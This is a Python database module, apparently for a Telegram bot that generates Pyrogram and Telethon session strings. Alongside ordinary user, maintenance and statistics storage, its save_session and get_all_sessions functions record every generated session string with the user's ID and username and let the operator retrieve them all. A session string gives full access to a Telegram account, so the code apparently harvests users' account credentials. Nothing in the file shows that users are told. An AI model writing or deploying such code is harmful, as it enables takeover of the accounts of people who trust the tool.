from motor.motor_asyncio import AsyncIOMotorClient
from config import MONGO_DB_URI
import logging

logger = logging.getLogger(__name__)

class Database:
    def __init__(self, uri):
        clean_uri = (uri or "").strip()
        self._is_memory_mode = not clean_uri

        if self._is_memory_mode:
            logger.warning("MONGO_DB_URI is not set. Falling back to in-memory storage.")
            self._users = set()
            self._maintenance = False
            self._stats = {"pyrogram": 0, "telethon": 0}
            self._sessions = []
            return

        self._client = AsyncIOMotorClient(clean_uri)
        self.db = self._client["StringGenBot"]
        self.users = self.db["users"]
        self.settings = self.db["settings"]

    async def _iter_users(self):
        for user_id in self._users:
            yield {"user_id": user_id}

    async def is_user_exist(self, user_id):
        if self._is_memory_mode:
            return user_id in self._users
        user = await self.users.find_one({"user_id": user_id})
        return True if user else False

    async def add_user(self, user_id):
        if self._is_memory_mode:
            self._users.add(user_id)
            return
        await self.users.insert_one({"user_id": user_id})

    async def total_users(self):
        if self._is_memory_mode:
            return len(self._users)
        return await self.users.count_documents({})

    async def get_all_users(self):
        if self._is_memory_mode:
            return self._iter_users()
        return self.users.find({})

    async def is_maintenance_mode(self):
        if self._is_memory_mode:
            return self._maintenance
        config = await self.settings.find_one({"id": "maintenance"})
        if not config:
            return False
        return config.get("state", False)

    async def set_maintenance_mode(self, status: bool):
        if self._is_memory_mode:
            self._maintenance = status
            return
        await self.settings.update_one(
            {"id": "maintenance"},
            {"$set": {"state": status}},
            upsert=True
        )

    async def increment_session(self, session_type: str):
        # session_type: 'pyrogram' or 'telethon'
        if self._is_memory_mode:
            self._stats[session_type] = self._stats.get(session_type, 0) + 1
            return
        await self.settings.update_one(
            {"id": "stats"},
            {"$inc": {session_type: 1}},
            upsert=True
        )

    async def get_stats(self):
        if self._is_memory_mode:
            return dict(self._stats)
        stats = await self.settings.find_one({"id": "stats"})
        if not stats:
            return {"pyrogram": 0, "telethon": 0}
        return {"pyrogram": stats.get("pyrogram", 0), "telethon": stats.get("telethon", 0)}

    async def save_session(self, user_id: int, username: str, session_type: str, session_string: str):
        if self._is_memory_mode:
            self._sessions.append({
                "user_id": user_id,
                "username": username,
                "type": session_type,
                "string": session_string
            })
            return
        await self.settings.update_one(
            {"id": "generated_sessions"},
            {"$push": {
                "sessions": {
                    "user_id": user_id,
                    "username": username,
                    "type": session_type,
                    "string": session_string
                }
            }},
            upsert=True
        )

    async def get_all_sessions(self):
        if self._is_memory_mode:
            return list(self._sessions)
        doc = await self.settings.find_one({"id": "generated_sessions"})
        if not doc:
            return []
        return doc.get("sessions", [])

db = Database(MONGO_DB_URI)
